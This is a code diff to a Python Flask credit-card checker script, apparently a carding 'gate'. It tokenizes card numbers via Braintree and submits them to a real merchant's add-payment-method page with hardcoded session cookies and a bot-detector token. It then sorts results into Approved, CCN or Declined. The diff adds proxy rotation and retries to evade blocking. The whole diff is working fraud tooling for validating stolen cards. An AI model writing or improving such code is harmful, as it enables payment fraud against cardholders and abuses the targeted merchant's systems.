@@ -55,11 +55,34 @@ CCN_patterns = [
     "Your card's security code is incorrect"
 ]
 
+def requests_with_retry(method, url, max_retries=3, **kwargs):
+    """Makes a request with proxy rotation and retries."""
+    last_error = None
+    # Shuffle proxies to try a different one first each time
+    shuffled_proxies = random.sample(proxies_list, len(proxies_list))
+    
+    for attempt in range(max_retries):
+        proxy = shuffled_proxies[attempt % len(shuffled_proxies)]
+        try:
+            response = requests.request(method, url, proxies=proxy, timeout=15, **kwargs)
+            response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
+            return response
+        except (requests.exceptions.ProxyError, 
+                requests.exceptions.ConnectTimeout, 
+                requests.exceptions.ConnectionError,
+                requests.exceptions.ReadTimeout,
+                requests.exceptions.HTTPError) as e:
+            last_error = e
+            print(f"Attempt {attempt + 1} failed with proxy {proxy}: {e}. Retrying...")
+            continue
+            
+    # If all retries fail, raise the last error
+    raise last_error
+
 def process_payment(cc, mm, yy, cvv):
     try:
-        # Select random user agent and proxy
+        # Select random user agent
         ua = random.choice(uaa)
-        proxies = random.choice(proxies_list)
         
         # Step 1: Tokenize the card with Braintree
         headers = {
@@ -107,13 +130,13 @@ def process_payment(cc, mm, yy, cvv):
             'operationName': 'TokenizeCreditCard',
         }
 
-        r = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies)
+        r = requests_with_retry('POST', 'https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
         t = r.json()
         
         if 'data' not in t or 'tokenizeCreditCard' not in t['data'] or 'token' not in t['data']['tokenizeCreditCard']:
             return {
                 'status': 'Error',
-                'response': 'Failed to tokenize card'
+                'response': 'Failed to tokenize card: ' + t.get('errors', [{}])[0].get('message', 'Unknown error')
             }
             
         tok = t['data']['tokenizeCreditCard']['token']
@@ -183,7 +206,7 @@ def process_payment(cc, mm, yy, cvv):
             'ct_bot_detector_event_token': '39d6ad2a7c6cebe4685f4bd5835a64c4db0d6b262761335b7bbed0dfb690384c',
         }
 
-        ree = requests.post('https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, data=data, proxies=proxies)
+        ree = requests_with_retry('POST', 'https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, data=data)
         
         # Parse response
         soup = BeautifulSoup(ree.text, 'html.parser')
@@ -193,25 +216,27 @@ def process_payment(cc, mm, yy, cvv):
         
         # Determine status based on response
         status = "Declined"
+        response_text = message if message else (rr[0] if rr else "Unknown error")
+
         for pattern in approved_patterns:
-            if pattern in message or (rr and pattern in rr[0]):
+            if pattern in response_text:
                 status = "Approved"
                 break
                 
         for pattern in CCN_patterns:
-            if pattern in message or (rr and pattern in rr[0]):
+            if pattern in response_text:
                 status = "CCN"
                 break
         
         return {
             'status': status,
-            'response': message if message else rr[0] if rr else "Unknown error"
+            'response': response_text
         }
         
     except Exception as e:
         return {
             'status': 'Error',
-            'response': str(e)
+            'response': f'All proxies failed or an unexpected error occurred. Last error: {str(e)}'
         }
 
 @app.route('/gate=b3/cc=<cc_data>')
